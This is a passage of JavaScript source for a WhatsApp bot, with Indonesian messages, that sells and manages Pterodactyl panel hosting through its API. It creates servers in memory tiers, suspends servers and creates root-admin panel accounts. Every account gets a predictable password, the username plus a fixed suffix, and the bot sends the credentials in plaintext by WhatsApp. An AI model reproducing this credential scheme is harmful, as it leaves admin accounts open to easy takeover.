listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listprem +=`Untuk Menghapus Akses Prem Ketik ${prefix}delprem 628xxx/@tag`
XeonBotInc.sendMessage(m.chat, {text: listprem },{quoted: XeonBotInc.chat})
}
break
case "addsrv": {
if (!XeonTheCreator) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case 'suspend': {
            if (!XeonTheCreator) return reply(`Khusus Danzz Ofc Ajah`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!XeonTheCreator) return reply(`Khusus Danzz Ofc Ajah`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case "createadmin": {
if (!XeonTheCreator) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await XeonBotInc.sendMessage(m.chat, listMessage)

    await XeonBotInc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}


*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

}
break
                case "createadmin2": {
if (!XeonTheCreator) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Admin",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: Admin

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

`
    const listMessage = {

        text: tks,

    }

	

    await XeonBotInc.sendMessage(m.chat, listMessage)

    await XeonBotInc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain2}


*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case "listadmin": {
  if (!XeonTheCreator) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await XeonBotInc.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "1gb": {
    if (!isPrem) return replyprem(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location3
let memo = "1024"
let cpu = "15"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY DanzBotz Official⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}
 

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs DanzBotz Official
`)

}

break
case "2gb": {
if (!isPrem) return replyprem(mess.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location3
let memo = "2048"
let cpu = "20"
let disk = "2050"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPrem) return replyprem(mess.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location3
let memo = "3072"
let cpu = "40"
let disk = "3073"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPrem) return replyprem(mess.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4GB"
let egg = global.eggsnya
let loc = global.location3
let memo = "4048"
let cpu = "50"
let disk = "4040"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isPrem) return replyprem(mess.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unlimited"
let egg = global.eggsnya
let loc = global.location3
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPrem) return replyprem(mess.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location3
let memo = "5138"
let cpu = "70"
let disk = "5138"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isPrem) return replyprem(mess.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location3
let memo = "6100"
let cpu = "100"
let disk = "6100"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
XeonBotInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: XeonBotInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isPrem) return replyprem(mess.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location3
